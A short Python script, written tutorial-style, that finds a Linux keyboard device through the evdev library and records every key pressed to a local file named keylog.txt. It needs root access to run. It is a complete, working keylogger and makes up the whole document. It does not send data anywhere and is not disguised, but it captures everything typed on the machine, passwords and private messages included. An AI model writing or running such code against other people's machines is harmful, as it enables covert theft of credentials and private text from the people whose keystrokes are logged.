import evdev
from evdev import ecodes
import sys

# 1. FIND THE KEYBOARD
def get_keyboard_device():
    devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
    for device in devices:
        # We look for a device that has keys (EV_KEY) and usually isn't a mouse
        if "keyboard" in device.name.lower():
            print(f"Found Keyboard: {device.name} at {device.path}")
            return device
    return None

device = get_keyboard_device()

if not device:
    print("No keyboard found! (Are you running with sudo?)")
    sys.exit()

print(f"Listening to {device.name}... Press Ctrl+C to stop.")

# 2. LOG KEYS
log_file = "keylog.txt"

try:
    # Open the device to capture inputs
    for event in device.read_loop():
        if event.type == ecodes.EV_KEY:
            # key_event is an object holding the key data
            key_event = evdev.categorize(event)
            
            # We only care when the key is DOWN (keystate 1) or HOLD (keystate 2)
            if key_event.keystate == key_event.key_down:
                
                # Get the name of the key (e.g., KEY_A, KEY_ENTER)
                key_name = key_event.keycode
                
                # Clean it up: Remove "KEY_" prefix
                if isinstance(key_name, list):
                    clean_key = key_name[0].replace("KEY_", "")
                else:
                    clean_key = key_name.replace("KEY_", "")
                
                # Formatting for the log file
                if len(clean_key) == 1:
                    output = clean_key  # Letters
                elif clean_key == "SPACE":
                    output = " "
                elif clean_key == "ENTER":
                    output = "\n"
                else:
                    output = f"[{clean_key}]"

                # Write to file
                with open(log_file, "a") as f:
                    f.write(output)
                    # Use 'flush' to save instantly so you see it in real-time
                    f.flush() 

except KeyboardInterrupt:
    print("\nStopping...")
except PermissionError:
    print("\nError: You need SUDO to read hardware devices!")
